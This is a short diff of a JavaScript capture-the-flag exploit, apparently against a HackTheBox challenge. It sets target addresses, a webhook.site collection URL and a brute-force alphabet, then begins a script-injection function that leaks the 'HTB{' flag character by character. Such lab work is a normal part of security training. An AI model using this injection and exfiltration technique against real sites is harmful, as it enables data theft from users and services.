@@ -7,10 +7,10 @@
 var ip = '127.0.0.1:1337';
 var ip2 = '188.166.171.200:30840';
 var hook = 'https://webhook.site/3fec1021-2d5a-44ec-a591-8bc65a7157bc';
-var flag = 'Ba';
+var flag = 'HTB{';
 var abc = '-+!@abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789{}_';
 var special = '_%\"\'';
-var url1 = `http://${ip}/api/entries/search?q=`;
+var url1 = `http://${ip2}/api/entries/search?q=`;
 async function getPartialFlag(char){
  return new Promise((resolve, reject)=>{
  const script = document.createElement("script");
